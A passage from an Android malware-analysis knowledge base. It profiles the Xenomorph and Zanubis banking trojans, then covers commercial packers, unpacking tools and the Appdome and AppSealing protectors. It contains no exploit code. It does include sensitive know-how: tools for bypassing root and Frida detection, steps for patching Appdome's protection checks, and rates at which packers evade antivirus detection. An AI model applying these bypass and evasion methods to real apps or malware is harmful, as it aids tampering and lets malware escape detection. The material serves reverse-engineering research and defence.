app.</p>"},{"location":"malware/families/xenomorph/#v3-full-feature-set","title":"v3 Full Feature Set","text":"Capability Implementation ATS engine JSON-scripted runtime, autonomous transfer execution Overlay injection WebView injects for 400+ targets Keylogging Accessibility event capture SMS/notification interception Read, intercept, suppress messages Cookie stealing Captures session cookies from target apps MFA bypass Reads TOTP codes from authenticator apps via accessibility Screen capture On-demand screenshots sent to C2 Anti-removal Prevents uninstall through accessibility"},{"location":"malware/families/xenomorph/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/xenomorph/#modular-architecture-v2","title":"Modular Architecture (v2+)","text":"<p>The v2 rewrite introduced a module-based system where each capability runs as an independent component. Modules can be loaded, updated, or replaced without modifying the core malware binary. This design carried forward into v3 and enabled the ATS engine to be delivered as an add-on module.</p>"},{"location":"malware/families/xenomorph/#ats-script-structure","title":"ATS Script Structure","text":"<p>The ATS engine processes JSON-formatted scripts from C2. Each script defines:</p> <ul> <li>Target: the package name of the banking app</li> <li>Steps: ordered array of accessibility actions</li> <li>Conditions: checks for UI state before proceeding (e.g., verify a button is visible)</li> <li>Data: transfer parameters (recipient, amount) injected into the flow</li> </ul> <p>The engine handles error recovery, retrying steps when expected UI elements are not found within a timeout period.</p>"},{"location":"malware/families/xenomorph/#c2-communication","title":"C2 Communication","text":"Component Details Protocol HTTPS Data format JSON payloads Configuration Target lists, inject URLs, ATS scripts delivered per-device based on installed apps Commands Install module, update config, execute ATS script, capture screen, steal cookies"},{"location":"malware/families/xenomorph/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Version Regions Notable Targets v1 Spain, Portugal, Italy, Belgium 56 EU banking apps v2 Same as v1, expanded ~100 apps v3 EU, US, Middle East, Asia 400+ banking apps, cryptocurrency wallets <p>ThreatFabric's v3 analysis noted the target list expansion represented a 6x increase over prior versions, with institutions spanning all continents.</p> <p>September 2023 US expansion: ThreatFabric documented Xenomorph targeting 30+ US financial institutions including Chase, Citi, Bank of America, Capital One, and multiple cryptocurrency platforms. This marked the first deliberate US campaign.</p>"},{"location":"malware/families/xenomorph/#notable-campaigns","title":"Notable Campaigns","text":"<p>February 2022: ThreatFabric identified Xenomorph v1 on Google Play via a \"Fast Cleaner\" dropper app with 50,000+ downloads. The malware targeted 56 European banking apps with overlay injection and SMS interception.</p> <p>May 2022: Hadoken Security Group claimed ownership of Xenomorph and GymDrop on a dark web forum, establishing public attribution.</p> <p>June 2022: Xenomorph v2 appeared in brief testing campaigns. ThreatFabric noted the complete code overhaul and modular architecture as preparation for future capabilities.</p> <p>August 2022: ThreatFabric discovered BugDrop, a Hadoken-developed dropper designed to bypass Android 13's sideloading restrictions, indicating the group was actively investing in distribution infrastructure.</p> <p>March 2023: Xenomorph v3 was disclosed by ThreatFabric, distributed via Zombinder-bound currency converter apps. The ATS engine and expanded target list of 400+ institutions represented a major operational leap.</p> <p>September 2023: ThreatFabric reported Xenomorph targeting 30+ US banks for the first time, distributed through fake Chrome browser download pages rather than Play Store droppers.</p>"},{"location":"malware/families/zanubis/","title":"Zanubis","text":"<p>Zanubis is a Peruvian Android banking trojan that evolved from a simple overlay banker targeting local financial institutions to a sophisticated multi-faceted threat impersonating government services. Kaspersky first covered the family in a September 2023 crimeware report and published a detailed evolution analysis in March 2025 documenting its expansion from 40 banking app targets to government agency impersonation, including spoofing SUNAT (Peru's national tax authority).</p>"},{"location":"malware/families/zanubis/#overview","title":"Overview","text":"Attribute Details First Seen 2022 Last Seen Active (ongoing campaigns) Status Active, expanding target scope Type Banking trojan with overlay attacks and ATS Attribution Unknown; operations focused on Peru Aliases None known"},{"location":"malware/families/zanubis/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Zanubis ESET Android/Spy.Banker.Zanubis McAfee Android/Zanubis"},{"location":"malware/families/zanubis/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Zanubis is independently developed with no direct code connection to other documented families. It is one of the few banking trojans specifically targeting the Peruvian financial sector, operating in the same Latin American space as PixPirate (Brazil) and ToxicPanda (originally Southeast Asia, expanded to LATAM).</p>"},{"location":"malware/families/zanubis/#evolution","title":"Evolution","text":"Phase Period Capabilities Initial 2022 Basic overlay banker targeting Peruvian banking apps Expansion 2023 Added government app impersonation, broader targeting Mature 2024-2025 Full ATS, SUNAT spoofing, energy sector expansion"},{"location":"malware/families/zanubis/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating SUNAT (tax authority) with fake tax notices Fake government apps APKs disguised as SUNAT official applications Fake banking apps APKs impersonating Peruvian banking apps Social engineering Urgency-based lures about tax penalties and legal obligations <p>The government impersonation distribution is particularly effective in Peru, where SUNAT communications carry legal weight. Users receiving what appears to be an official tax notice are motivated to install the \"SUNAT app\" to resolve the supposed issue.</p>"},{"location":"malware/families/zanubis/#capabilities","title":"Capabilities","text":"Capability Description Overlay attacks Credential phishing overlays over 40+ banking apps ATS (Automated Transfer Systems) Automated fund transfers via accessibility service Keylogging Accessibility-based keystroke capture SMS interception Reads and intercepts OTP codes Screen recording Records device screen during banking sessions Contact exfiltration Uploads contact list for targeting App impersonation Disguises as SUNAT tax authority app Persistence Prevents uninstallation via accessibility"},{"location":"malware/families/zanubis/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Overlay triggering, ATS automation, keylogging, persistence, foreground app monitoring SYSTEM_ALERT_WINDOW Display phishing overlays and SUNAT impersonation UI READ_SMS Read SMS messages for OTP interception RECEIVE_SMS Real-time SMS interception SEND_SMS Send SMS from victim device READ_CONTACTS Contact exfiltration for targeting READ_PHONE_STATE Device fingerprinting INTERNET HTTP and WebSocket C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot WAKE_LOCK Keep device active during ATS operations QUERY_ALL_PACKAGES Enumerate installed apps for target matching REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Prevent system from killing background processes"},{"location":"malware/families/zanubis/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/zanubis/#overlay-injection","title":"Overlay Injection","text":"<p>Zanubis uses standard overlay attack techniques:</p> <ul> <li>Monitors foreground app changes via accessibility service</li> <li>Matches against a target list of 40+ Peruvian banking and financial apps</li> <li>Displays WebView-based phishing overlays matching the target app's login screen</li> <li>Captured credentials sent to C2</li> </ul>"},{"location":"malware/families/zanubis/#sunat-impersonation","title":"SUNAT Impersonation","text":"<p>The government impersonation component displays a convincing SUNAT interface while the malware operates in the background. The fake SUNAT app:</p> <ul> <li>Shows official SUNAT branding and color scheme</li> <li>Displays fake tax documents and payment forms</li> <li>Requests personal information (DNI, RUC tax numbers)</li> <li>Runs banking overlay monitoring in the background</li> </ul>"},{"location":"malware/families/zanubis/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based C2 with JSON payloads</li> <li>WebSocket connections for real-time operator control during ATS operations</li> <li>Configuration and target list updates from C2</li> <li>Encrypted exfiltration of captured credentials</li> </ul>"},{"location":"malware/families/zanubis/#target-regions","title":"Target Regions","text":"Region Details Peru Primary and near-exclusive target <p>Target institutions include major Peruvian banks (BCP, BBVA Peru, Interbank, Scotiabank Peru) and government services (SUNAT). The narrow geographic focus parallels PixPirate's Brazil-exclusive targeting and Copybara's Italy-focused operations.</p>"},{"location":"malware/families/zanubis/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: Zanubis first appears targeting Peruvian banking customers with basic overlay attacks.</p> <p>2023, September: Kaspersky includes Zanubis in a crimeware report alongside ASMCrypt and Lumma, documenting its initial technical capabilities.</p> <p>2024-2025: Zanubis evolves significantly. Kaspersky publishes a full evolution analysis documenting the transition from simple banking overlay trojan to a sophisticated threat with SUNAT government impersonation, energy sector targeting, and ATS capabilities. The target list expands to 40+ financial apps.</p>"},{"location":"malware/families/zanubis/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Primary protocol HTTP with JSON payloads Real-time channel WebSocket for operator-controlled ATS sessions Configuration Target app list and overlay templates delivered from C2 Credential exfiltration Encrypted POST requests to C2 Command polling Regular interval polling for new instructions"},{"location":"malware/families/zanubis/#detection","title":"Detection","text":"Indicator Type Details SUNAT impersonation App using official SUNAT branding, requesting tax identifiers (DNI, RUC) Accessibility abuse App requesting accessibility with no legitimate UI-assistance purpose Overlay activity WebView-based windows rendered over Peruvian banking applications Target app monitoring Continuous foreground app monitoring via accessibility events ATS behavior Automated navigation through banking app transfer flows Peruvian focus Hardcoded references to BCP, BBVA Peru, Interbank, Scotiabank Peru, and SUNAT"},{"location":"malware/families/zanubis/#related-families","title":"Related Families","text":"Family Relationship PixPirate Both target a single Latin American country exclusively (Zanubis targets Peru, PixPirate targets Brazil). Both implement ATS for automated fraud. ToxicPanda Both use ATS capabilities for automated fund transfers, though ToxicPanda originated in Southeast Asia before expanding to LATAM and Europe. Copybara Both demonstrate the pattern of country-specific banking trojans with narrow geographic focus and deep local targeting. GodFather Zanubis's overlay injection approach follows the standard model established by earlier families like GodFather and Anubis."},{"location":"malware/families/zanubis/#references","title":"References","text":"<ul> <li>Kaspersky - Crimeware report: ASMCrypt, Lumma, Zanubis (September 2023)</li> <li>Kaspersky - Evolution of Zanubis banking trojan (March 2025)</li> </ul>"},{"location":"packers/","title":"Android Packers &amp; Obfuscators","text":"<p>Packers (protectors, armoring tools) transform APKs to resist reverse engineering, tampering, and automated analysis. Legitimate developers use them to protect IP. Malware authors use them to evade detection and slow down analysts.</p> <p>Obfuscators are a lighter category: they transform code to make it harder to read but don't encrypt or pack DEX files. Many protection products combine both.</p> <p>APKiD can identify most commercial packers and obfuscators automatically.</p>"},{"location":"packers/#packers-protectors","title":"Packers / Protectors","text":"Packer Vendor Origin Status 360 Jiagu Qihoo 360 China Documented APKProtect Nagain China Documented Arxan (Digital.ai) Digital.ai USA Documented Baidu Reinforcement Baidu China Documented Bangcle (SecNeo) Bangcle China Documented DexGuard Guardsquare Belgium Documented DexProtector Licel Netherlands Documented iJiami iJiami China Documented NeteaseYiDun NetEase China Documented Promon SHIELD Promon Norway Documented Tencent Legu Tencent China Documented Virbox SenseShield Technology China Documented"},{"location":"packers/#obfuscators","title":"Obfuscators","text":"Obfuscator Type Notes R8 / ProGuard Free (Google/open source) Default Android build tools. Name obfuscation, dead code removal, optimization. R8 replaced ProGuard. Allatori Commercial Java/Android obfuscator. String encryption, flow obfuscation, watermarking. DashO Commercial PreEmptive Solutions. Obfuscation + tamper detection + analytics. Zelix KlassMaster Commercial Aggressive flow obfuscation, string encryption, stack trace obfuscation. OLLVM Open source Obfuscator-LLVM. Control flow flattening, bogus control flow, string encryption for native code. Used by Mandrake."},{"location":"packers/#protection-capabilities-comparison","title":"Protection Capabilities Comparison","text":"Feature Packers Obfuscators RASP Name obfuscation Yes Yes No String encryption Yes Some No DEX encryption Yes No No Native code wrapping Yes No No Anti-debugging Yes No Yes Anti-tampering Yes No Yes Root detection Some No Yes Emulator detection Some No Yes Runtime self-protection Some No Yes <p>RASP (Runtime Application Self-Protection) products like Promon SHIELD focus on runtime checks rather than code transformation. They detect hostile environments (root, hooking, debugging) and respond at runtime, often combined with a packer or obfuscator.</p>"},{"location":"packers/#malware-families-by-packer","title":"Malware Families by Packer","text":"<p>Commercial packers are increasingly adopted by malware authors. The packer provides anti-analysis protection without the developer needing to build their own.</p> Packer Families Notes Virbox Gigabud, Klopatra, GoldDigger/GoldPickaxe GoldFactory group standardized on Virbox. <code>libvdog.so</code> marker. DexGuard Anatsa, Xenomorph Higher-tier MaaS families use DexGuard's commercial protection. Tencent Legu Triada, various Chinese malware Common in Chinese market. <code>libshella.so</code> / <code>libshellx.so</code> marker. 360 Jiagu Chinese banking trojans, stalkerware <code>libjiagu.so</code> marker. Multi-DEX support. Bangcle Regional malware, adware <code>libsecexe.so</code> / <code>libSecShell.so</code> marker. Custom packers Mandrake, SoumniBot OLLVM-obfuscated native loaders (Mandrake), manifest parsing exploits (SoumniBot) No packer (obfuscation only) Cerberus lineage, SpyNote Rely on string encryption, class renaming, and custom obfuscation instead of commercial packers"},{"location":"packers/#universal-unpacking-toolkit","title":"Universal Unpacking Toolkit","text":"<p>Tools for approaching any packed sample regardless of the specific packer.</p>"},{"location":"packers/#dex-recovery","title":"DEX Recovery","text":"Tool Purpose Packer Coverage frida-dexdump Scans process memory for DEX magic bytes and dumps all loaded DEX files All packers that decrypt DEX into memory (Chinese packers, DexGuard, DexProtector) FART ART-level DEX dumper. Patches <code>dex2oat</code> to dump DEX at compilation time Effective against packers that use <code>InMemoryDexClassLoader</code> DexDump (hanbinglengyue) Xposed module for dumping DEX at class loading Older Chinese packers, some DexGuard builds reFrida Pre-built Frida scripts including DEX interception and string decryption Broad coverage with configurable hooks"},{"location":"packers/#rasp-bypass","title":"RASP Bypass","text":"Tool Purpose Notes Objection Runtime mobile exploration. Built-in root, SSL, and debug bypasses Good starting point, handles common detection patterns Shamiko Zygisk module that hides Magisk root from detection Preferred for Promon SHIELD and Arxan ZygiskFrida Injects Frida gadget via Zygisk at process spawn Avoids ptrace-based detection. Critical for Arxan and DexProtector MagiskHide Props Config Modifies device fingerprint properties to defeat emulator detection Useful when running on physical rooted device"},{"location":"packers/#native-analysis","title":"Native Analysis","text":"Tool Purpose When to Use Ghidra + D-810 Native decompiler with OLLVM deobfuscation plugin Arxan guard network, Mandrake native loaders, Promon SHIELD library IDA Pro + Keypatch Native disassembler with inline patching Virbox VM interpreter, DexProtector native bridge Frida Stalker Instruction-level tracing at runtime Tracing Virbox VM dispatch loop, mapping guard execution in Arxan"},{"location":"packers/#recommended-lab-setup","title":"Recommended Lab Setup","text":"<pre><code>Physical device (Pixel 5+, rooted with Magisk + Zygisk)\n  \u251c\u2500 Shamiko (hide root from target app)\n  \u251c\u2500 ZygiskFrida (stealth Frida injection)\n  \u251c\u2500 Objection (runtime exploration)\n  \u2514\u2500 mitmproxy (network interception)\n\nAlternative: Android emulator (API 30-33)\n  \u251c\u2500 frida-server on non-default port (rename binary)\n  \u251c\u2500 Burp Suite / mitmproxy with custom CA\n  \u2514\u2500 Note: many commercial packers detect emulators\n</code></pre> <p>Physical devices are strongly preferred for DexProtector, Promon SHIELD, and Arxan analysis. These products aggressively detect emulators and virtual environments. Chinese packers and DexGuard are generally workable in emulators with basic evasion.</p>"},{"location":"packers/#unpacking-strategy","title":"Unpacking Strategy","text":"<pre><code>1. Identify packer (APKiD, manual inspection of native libs)\n2. Choose approach:\n   - Memory dump: hook DexClassLoader/InMemoryDexClassLoader to capture DEX at load time\n   - Process dump: dump /proc/self/maps regions containing DEX magic bytes\n   - Framework hook: intercept ClassLoader to extract loaded classes\n3. Reconstruct DEX from dump\n4. Decompile unpacked DEX normally (JADX, Ghidra)\n</code></pre> <p>For packer-specific unpacking procedures, see the individual packer pages. Frida DEX dumping scripts cover the universal hooking approach.</p>"},{"location":"packers/#custom-packers","title":"Custom Packers","text":"<p>Some malware authors build their own packing solutions rather than using commercial products. These require per-sample analysis but follow predictable patterns.</p> Technique Examples Analysis Approach XOR-encrypted DEX in assets Budget banking trojans, SMS stealers Extract asset, brute-force single-byte XOR key (typically visible in native loader) AES-encrypted second stage Multi-stage droppers Hook <code>javax.crypto.Cipher</code> to intercept key and IV, or extract from native loader Steganographic DEX in images Necro Reverse the pixel-to-byte extraction algorithm from the loader class Manifest manipulation SoumniBot Install on device and dump via <code>adb shell dumpsys package</code>, bypassing parser bugs OLLVM-obfuscated native loader Mandrake D-810 for OLLVM deobfuscation, Frida Stalker for runtime tracing Encrypted shared preferences payload Dropper-style malware Hook <code>SharedPreferences.getString()</code> to capture decrypted payload before loading Split APK abuse Play Store droppers Reassemble all splits into a single APK using <code>bundletool</code>, then analyze normally <p>Custom packers are generally easier to break than commercial ones because they lack the engineering investment in anti-tampering and anti-hooking. The main challenge is identifying the specific decryption mechanism, which is usually straightforward once the native loader or Java-based decryptor is located.</p>"},{"location":"packers/#packer-comparison-matrix","title":"Packer Comparison Matrix","text":"<p>Head-to-head comparison across all documented packers on the features that matter for analysis.</p> Feature Virbox DexGuard DexProtector Arxan Promon Chinese Packers DEX encryption Yes Yes (class-level) Yes Partial No Yes (whole DEX) DEX virtualization Yes (core feature) Optional No No No No String encryption Yes (VM-based) Yes (method calls) Yes (white-box, dynamic keys) Yes No Basic XOR Native code protection Yes Yes Yes Yes (guard network) No (RASP only) No Anti-Frida Yes Yes Yes Yes Yes Basic Anti-root Yes Yes Yes Yes Yes Basic Anti-emulator Yes Yes Yes Yes Yes Basic White-box crypto No No Yes (vTEE CryptoModule) Yes No No RASP Partial Partial Yes (core feature) Yes Yes (primary) No Code virtualization DEX + native Optional Hide Access (native bridge) Guard-level No No Unpacking difficulty Expert Medium-Hard Medium-Hard Hard Medium (bypass) Easy-Medium Cost to attacker Medium High High High N/A (defensive) Free"},{"location":"packers/#analysis-decision-tree","title":"Analysis Decision Tree","text":"<p>When encountering a protected sample, use this sequence to minimize wasted effort:</p> <pre><code>Start\n  |\n  \u251c\u2500 Run APKiD\n  \u2502   \u251c\u2500 Packer identified \u2192 Go to packer-specific page\n  \u2502   \u251c\u2500 Obfuscator only \u2192 Proceed with jadx, use deobfuscation scripts\n  \u2502   \u2514\u2500 Unknown protection \u2192 Manual inspection below\n  |\n  \u251c\u2500 Check native libraries\n  \u2502   \u251c\u2500 libvirbox_*.so \u2192 Virbox (virtualized, needs dynamic analysis)\n  \u2502   \u251c\u2500 libshell*.so \u2192 Tencent Legu\n  \u2502   \u251c\u2500 libjiagu*.so \u2192 Qihoo 360\n  \u2502   \u251c\u2500 libdexguard.so \u2192 DexGuard\n  \u2502   \u251c\u2500 libdexprotector.*.so / libdpboot.so \u2192 DexProtector\n  \u2502   \u251c\u2500 libsecexe.so \u2192 Bangcle\n  \u2502   \u2514\u2500 Unknown .so \u2192 Check strings, imports for packer signatures\n  |\n  \u251c\u2500 Check obfuscation level\n  \u2502   \u251c\u2500 a/b/c class names, no string encryption \u2192 R8/ProGuard only\n  \u2502   \u251c\u2500 Single-char classes + byte[]-&gt;String methods \u2192 DexGuard string encryption\n  \u2502   \u251c\u2500 All strings readable, class names intact \u2192 No obfuscation\n  \u2502   \u2514\u2500 Native JNI stubs replacing Java methods \u2192 Virtualization (Virbox or DexGuard advanced)\n  |\n  \u2514\u2500 Choose approach\n      \u251c\u2500 Obfuscation only \u2192 Static analysis with jadx deobfuscation\n      \u251c\u2500 DEX encryption \u2192 frida-dexdump or DexClassLoader hook\n      \u251c\u2500 Virtualization \u2192 Dynamic analysis only (hook VM interpreter)\n      \u2514\u2500 RASP only \u2192 Frida with detection bypass hooks\n</code></pre>"},{"location":"packers/#packer-trends-in-malware-2024-2025","title":"Packer Trends in Malware (2024-2025)","text":"Trend Details Commercial packer adoption Malware authors increasingly use commercial packers (Virbox, DexGuard) rather than custom solutions. Reduces development cost at the expense of identifiable signatures. Multi-layer protection Modern samples combine a commercial packer with custom obfuscation layers. Klopatra uses Virbox + custom string encryption. Packer-as-a-Service Underground forums offer packing services where customers submit APKs and receive protected versions. No need to license the packer directly. Custom packers declining Only sophisticated groups like Mandrake developers invest in custom OLLVM-based protection. Most operators use off-the-shelf solutions. RASP integration Banking trojans increasingly encounter RASP-protected target apps (Promon, Arxan), requiring malware to bypass runtime checks to perform overlay injection or accessibility manipulation. Manifest-level evasion SoumniBot demonstrated that packing the code is not the only option. Malforming the APK structure itself can defeat analysis tools without any packer."},{"location":"packers/#detection-evasion-effectiveness","title":"Detection Evasion Effectiveness","text":"<p>How much each protection layer reduces detection rates across multi-engine scanning:</p> Protection Approximate Detection Rate Reduction Why No protection Baseline All engines can scan the raw DEX R8/ProGuard only 5-10% Engines pattern-match on behavior, not names Chinese packer (basic) 30-50% Engines scan the stub, not the encrypted payload DexGuard 50-70% String encryption hides IoCs; class encryption hides behavior patterns Virbox (virtualized) 70-90% Proprietary VM instructions are opaque to all static scanners Custom packer + obfuscation 60-80% Varies by implementation quality RASP only (no packing) 0-10% Code is still scannable; RASP operates at runtime <p>These figures are approximate and based on observed VirusTotal detection ratios for packed vs unpacked samples of the same families. The main takeaway: DEX virtualization (Virbox) provides the highest static analysis resistance, while basic Chinese packers offer adequate protection against automated scanning but fall quickly to manual Frida-based analysis.</p>"},{"location":"packers/appdome/","title":"Appdome","text":"<p>Appdome is a commercial no-code mobile security platform developed by Appdome Inc (USA/Israel). It operates as a cloud-based SaaS that applies protection to compiled APK/AAB binaries without requiring source code access. The platform uses a patented \"Fusion\" technology that merges microservice-based protection plugins into existing Android and iOS applications through a web portal or REST API.</p>"},{"location":"packers/appdome/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Appdome Inc Origin Redwood City, California / Tel Aviv, Israel Type Commercial SaaS Protector (no-code, post-build) Platforms Android, iOS Integration Cloud portal upload, REST API, CI/CD plugins Model Per-app subscription licensing"},{"location":"packers/appdome/#how-fusion-works","title":"How Fusion Works","text":"<p>Appdome's Fusion engine operates on compiled binaries rather than source code. The workflow:</p> <ol> <li>Upload a compiled APK or AAB to the Appdome cloud portal (or submit via REST API)</li> <li>The Fusion engine analyzes the binary structure -- frameworks, libraries, SDKs, native components</li> <li>Selected protection plugins (microservice-based) are merged into the application</li> <li>At least one additional <code>classes.dex</code> is injected containing the protection policy logic</li> <li>The original <code>classes.dex</code> is modified to hook initialization and route through Appdome's protection layer</li> <li>The secured binary is output for signing and distribution</li> </ol> <p>The REST API enables CI/CD integration, allowing automated protection as part of build pipelines without manual portal interaction. Protection configuration is defined as a \"Fusion Set\" that specifies which plugins to apply.</p>"},{"location":"packers/appdome/#identification","title":"Identification","text":""},{"location":"packers/appdome/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies Appdome with the following signatures:</p> <pre><code>protector : Appdome\nAppdome (dex)\n</code></pre>"},{"location":"packers/appdome/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library <code>libloader.so</code> in <code>lib/arm64-v8a/</code> and <code>lib/armeabi-v7a/</code> Additional DEX Extra <code>classes.dex</code> file(s) containing protection policy String references Strings in <code>libloader.so</code> reference Appdome obfuscating compiler Modified manifest AndroidManifest.xml modified to route through Appdome initialization"},{"location":"packers/appdome/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/appdome/#dex-encryption-white-hat-android-packer","title":"DEX Encryption (White Hat Android Packer)","text":"<p>Appdome encrypts DEX bytecode using what it markets as a \"White Hat Android Packer.\" The original application code is encrypted and decrypted at runtime through the native <code>libloader.so</code> library.</p>"},{"location":"packers/appdome/#dex-and-control-flow-obfuscation","title":"DEX and Control Flow Obfuscation","text":"<p>The \"Dex Relocation\" plugin applies multiple obfuscation layers:</p> <ul> <li>Call obfuscation -- indirect method invocations replace direct calls</li> <li>Function call modification -- original call sites are rewritten</li> <li>Dummy code injection -- non-functional code paths inserted to complicate static analysis</li> <li>Control flow flattening within protected methods</li> </ul>"},{"location":"packers/appdome/#native-library-encryption","title":"Native Library Encryption","text":"<p>Native <code>.so</code> libraries bundled with the application are encrypted at rest and decrypted at load time through Appdome's native protection layer.</p>"},{"location":"packers/appdome/#ssl-pinning-with-bypass-detection","title":"SSL Pinning with Bypass Detection","text":"<p>Appdome implements certificate pinning that actively detects bypass attempts rather than simply failing silently. The pinning layer monitors for signs of MITM proxy interception and can trigger defensive responses when bypass tools are detected.</p>"},{"location":"packers/appdome/#anti-frida","title":"Anti-Frida","text":"<p>Appdome's Frida detection covers multiple injection vectors:</p> Detection Vector Description frida-server Detects standard frida-server process Inject mode Detects Frida injected via ptrace Gadget mode Detects FridaGadget.so loaded into the process Custom modules Scans for non-standard Frida modules Objection Detects Objection framework runtime StrongR Frida Detects recompiled Frida builds with modified signatures"},{"location":"packers/appdome/#anti-xposed","title":"Anti-Xposed","text":"<p>Detects the Xposed framework through class presence checks, stack trace inspection, and module enumeration.</p>"},{"location":"packers/appdome/#root-detection","title":"Root Detection","text":"Target Detection Magisk Binary presence, mount namespace analysis MagiskHide Detects hide list manipulation Shamiko Zygisk module detection Zygisk Module injection framework detection SuperSU su binary and package detection RootCloak Cloaking module detection"},{"location":"packers/appdome/#emulator-detection","title":"Emulator Detection","text":"<p>Identifies emulated environments through build properties, hardware fingerprinting, sensor availability, and telephony state analysis.</p>"},{"location":"packers/appdome/#anti-debugging","title":"Anti-Debugging","text":"<p>Monitors for debugger attachment via TracerPid checks, ptrace status, JDWP connection detection, and native debugger signatures.</p>"},{"location":"packers/appdome/#anti-tampering-oneshield","title":"Anti-Tampering (OneShield)","text":"<p>Appdome's OneShield feature validates the integrity of the protected binary at runtime. It checks APK signatures, DEX checksums, and native library integrity. Tampering triggers configurable responses including immediate termination or silent reporting.</p>"},{"location":"packers/appdome/#anti-repackaging","title":"Anti-Repackaging","text":"<p>Detects when the APK has been decompiled, modified, and rebuilt by verifying structural integrity beyond just the signing certificate.</p>"},{"location":"packers/appdome/#malware-and-overlay-detection","title":"Malware and Overlay Detection","text":"<p>Detects malicious overlay attacks and identifies known malware patterns running alongside the protected application.</p>"},{"location":"packers/appdome/#bypass-approaches","title":"Bypass Approaches","text":"<p>No comprehensive public bypass tool exists for Appdome. The multi-layered detection model means each protection mechanism must be defeated individually.</p>"},{"location":"packers/appdome/#primary-vector-native-library-patching","title":"Primary Vector: Native Library Patching","text":"<p>The most documented approach targets native library detection routines:</p> <ol> <li>Decompile the APK using apktool</li> <li>Load <code>libloader.so</code> into Ghidra or IDA Pro</li> <li>Locate Frida detection functions by searching for strings related to <code>/proc/net/unix</code>, <code>frida</code>, <code>gadget</code>, port 27042</li> <li>Patch detection function return values to always return \"safe\" -- NOP the branch or force the return register</li> <li>Rebuild and resign the APK</li> </ol> <p>This approach is limited by OneShield integrity checks, which detect the patched native library. Defeating OneShield requires locating and patching the integrity verification routines as well, creating a chain of patches.</p>"},{"location":"packers/appdome/#observed-bypass-attempts","title":"Observed Bypass Attempts","text":"<p>XDA Forums discussions document scenarios where root hiding (MagiskHide/Shamiko) combined with developer mode restrictions and Frida concealment can get past initial checks, but the application crashes when attempting SSL pinning bypass. This confirms the layered detection model -- bypassing one layer exposes the next.</p> <p>Progressive bypass is necessary: disable anti-debugging first, then anti-root, then anti-Frida, then SSL pinning, with each layer potentially requiring both Java and native level patches.</p>"},{"location":"packers/appdome/#malware-usage","title":"Malware Usage","text":"<p>Appdome has not been observed protecting malware samples. The cloud-based SaaS model makes it impractical for malware authors:</p> <ul> <li>Requires account creation with identity verification</li> <li>All protected binaries pass through Appdome's cloud infrastructure</li> <li>Per-app licensing creates a cost barrier</li> <li>Cloud processing leaves an audit trail</li> </ul>"},{"location":"packers/appdome/#industry-usage","title":"Industry Usage","text":"<p>Appdome is deployed primarily in industries requiring mobile app security compliance:</p> <ul> <li>Banking and financial services</li> <li>Fintech and mobile payments</li> <li>mCommerce and retail</li> <li>Trading platforms</li> <li>Healthcare applications</li> </ul> <p>The no-code model appeals to organizations without dedicated mobile security engineering teams, allowing security teams to apply protection without modifying build pipelines or requiring developer involvement.</p>"},{"location":"packers/appdome/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Appdome DexGuard DexProtector Promon Integration Cloud SaaS (no-code) Gradle plugin (source required) CLI post-build SDK integration Source required No Yes No No DEX encryption Yes Yes Yes No Code virtualization No Optional No No Anti-Frida Multi-vector Port + maps scanning Yes Yes Root detection Comprehensive Comprehensive Yes Core feature SSL pinning With bypass detection Native-level Yes Yes Malware adoption None Cracked versions in malware Rare None Unpacking difficulty Medium-high (layered) Medium (Frida hooks) Medium-high N/A (RASP)"},{"location":"packers/appdome/#references","title":"References","text":"<ul> <li>Appdome Mobile Security Platform</li> <li>Appdome Fusion Technical Overview</li> <li>Appdome REST API Documentation</li> <li>APKiD -- Android Application Identifier</li> <li>Appdome Anti-Frida Documentation</li> <li>Appdome OneShield Integrity Protection</li> </ul>"},{"location":"packers/appsealing/","title":"AppSealing","text":"<p>AppSealing is a cloud-based SaaS application protection platform developed by INKA Entworks (South Korea). It provides DEX encryption, native library protection, and anti-cheat detection through a web console where developers upload APKs and receive protected builds. The SaaS delivery model means no local tooling or build integration is required, distinguishing it from source-level protectors like DexGuard.</p>"},{"location":"packers/appsealing/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer INKA Entworks Origin South Korea Type Commercial SaaS Packer/Protector Platforms Android, iOS, Hybrid (Unity, Unreal, Cocos2d) Delivery Cloud-based (upload APK, receive protected build) Market Korean banking, gaming, enterprise apps Website appsealing.com"},{"location":"packers/appsealing/#identification","title":"Identification","text":""},{"location":"packers/appsealing/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies AppSealing with:</p> <pre><code>packer : appsealing\n</code></pre>"},{"location":"packers/appsealing/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>libcovault-appsec.so</code> Primary native security library <code>AppSealingZygote</code> Bootstrap class that initializes protection before app launch <code>assets/AppSealing/</code> Directory containing encrypted payloads and configuration <code>sealed1.dex</code> Encrypted DEX payload <code>aws_classes.dex</code> AppSealing wrapper DEX containing loader classes <code>api.appsealing.com</code> API endpoint for license verification and configuration"},{"location":"packers/appsealing/#appsealing-asset-directory","title":"AppSealing Asset Directory","text":"<p>The <code>assets/AppSealing/</code> directory contains a set of numbered and lettered files:</p> File Purpose <code>1</code> Primary encrypted payload <code>11</code> Secondary payload data <code>a1</code> Architecture-specific native data <code>a3</code> Architecture-specific native data (alternate) <code>aslc</code> AppSealing license configuration <code>hr</code> Hash/integrity reference data <code>s1</code> Sealed configuration block <code>s3</code> Sealed configuration block (alternate) <code>si</code> Sealing information metadata <code>x1</code> Executable payload (primary arch) <code>x3</code> Executable payload (alternate arch) <p>The naming scheme uses single characters and short codes rather than descriptive names. The numeric pairs (1/11, s1/s3, x1/x3, a1/a3) correspond to different architecture targets or protection 